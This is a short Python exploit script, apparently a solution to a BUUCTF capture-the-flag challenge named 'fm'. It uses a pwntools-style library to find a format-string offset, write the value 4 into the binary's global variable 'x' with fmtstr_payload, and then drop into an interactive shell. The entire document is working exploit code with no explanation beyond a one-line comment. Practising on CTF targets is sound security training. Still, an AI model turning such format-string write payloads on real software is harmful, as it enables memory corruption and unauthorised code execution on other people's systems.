import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
set_config(GameBoxConfig(
    is_local=True,
    file='./fm',
    remote='node4.buuoj.cn:28180',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True
))
s = sgtlibc.Searcher()
elf = client.elf


def exec(payload):
    start_game()
    sl(payload)
    info = rl()
    return info


# 格式化字符串漏洞
offset = FmtStr(exec, numbwritten=0x10).offset
g_x_addr = elf.symbols['x']
payload = fmtstr_payload(offset, {g_x_addr: 4})
start_game()
sl(payload)

interactive()
